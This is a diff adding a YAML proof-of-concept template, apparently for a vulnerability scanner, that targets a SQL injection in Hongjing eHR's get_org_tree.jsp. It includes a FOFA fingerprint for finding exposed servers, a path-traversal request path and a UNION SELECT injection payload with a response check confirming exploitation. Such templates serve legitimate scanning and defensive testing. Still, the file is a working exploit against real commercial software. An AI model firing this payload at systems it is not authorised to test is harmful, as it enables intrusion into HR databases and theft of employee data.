@@ -1,0 +1,19 @@
+id: poc-yaml-hjsoft-ehr-getorgtree-sqli
+info:
+  name: 宏景eHR get_org_tree.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(100,500)
+  t2: t1 * t1 * t1
+requests:
+- method: POST
+  path: /templates/attestation/../../kq/app_check_in/get_org_tree.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: params=1=0 union select 1,2,POWER({{.t1}},3),4--+
+  expression: "status_code == 200 && \ncontains(body,\" <TreeNode\") &&\ncontains(body,t2)\n"
+transport: http
